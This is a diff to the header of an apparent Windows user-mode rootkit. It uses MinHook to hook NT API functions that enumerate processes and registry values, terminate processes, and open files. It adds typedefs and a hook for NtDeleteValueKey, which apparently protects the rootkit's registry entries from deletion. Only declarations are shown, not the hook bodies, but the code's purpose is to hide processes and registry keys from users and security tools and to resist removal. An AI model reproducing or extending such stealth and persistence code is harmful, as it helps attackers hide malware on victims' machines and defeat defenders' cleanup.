@@ -6,9 +6,12 @@
 #include <stdio.h>
 #include <tlhelp32.h>
 #include <Psapi.h>
+#include <algorithm>
 #include <string>
 #include <cwctype>
 #include "MinHook.h"
+
+#include "config.h"
 
 #define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
 #define STATUS_OBJECT_NAME_NOT_FOUND ((NTSTATUS)0xC0000034)
@@ -95,19 +98,36 @@ typedef NTSTATUS(WINAPI* pNtOpenFile)(
     ULONG ShareAccess,
     ULONG OpenOptions);
 
+typedef NTSTATUS(WINAPI* pNtSetValueKey)(
+    HANDLE KeyHandle,
+    PUNICODE_STRING ValueName,
+    ULONG TitleIndex,
+    ULONG Type,
+    PVOID Data,
+    ULONG DataSize);
+
+typedef NTSTATUS(WINAPI* pNtDeleteValueKey)(
+  HANDLE KeyHandle,
+  PUNICODE_STRING ValueName);
+
 DWORD GetPPID(DWORD);
 int GetProcessName(DWORD, char*, DWORD);
 bool IsExplorerProcess(void);
 PWCHAR KeyValueInformationGetName(LPVOID, NT_KEY_VALUE_INFORMATION_CLASS);
+bool CheckExists(std::wstring, std::wstring, bool);
 
 NTSTATUS WINAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
 NTSTATUS WINAPI HookedNtTerminateProcess(HANDLE, UINT);
 NTSTATUS WINAPI HookedNtEnumerateValueKey(HANDLE, ULONG, NT_KEY_VALUE_INFORMATION_CLASS, LPVOID, ULONG, PULONG resultLength);
 NTSTATUS WINAPI HookedNtQueryValueKey(HANDLE, PUNICODE_STRING, NT_KEY_VALUE_INFORMATION_CLASS, PVOID, ULONG, PULONG);
 NTSTATUS WINAPI HookedNtOpenFile(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, ULONG, ULONG);
+// NTSTATUS WINAPI HookedNtSetValueKey(HANDLE, PUNICODE_STRING, ULONG, ULONG, PVOID, ULONG);
+NTSTATUS WINAPI HookedNtDeleteValueKey(HANDLE, PUNICODE_STRING);
 
 extern pNtQuerySystemInformation OriginalNtQuerySystemInformation;
 extern pNtTerminateProcess OriginalNtTerminateProcess;
 extern pNtEnumerateValueKey OriginalNtEnumerateValueKey;
 extern pNtQueryValueKey OriginalNtQueryValueKey;
 extern pNtOpenFile OriginalNtOpenFile;
+// extern pNtSetValueKey OriginalNtSetValueKey;
+extern pNtDeleteValueKey OriginalNtDeleteValueKey;
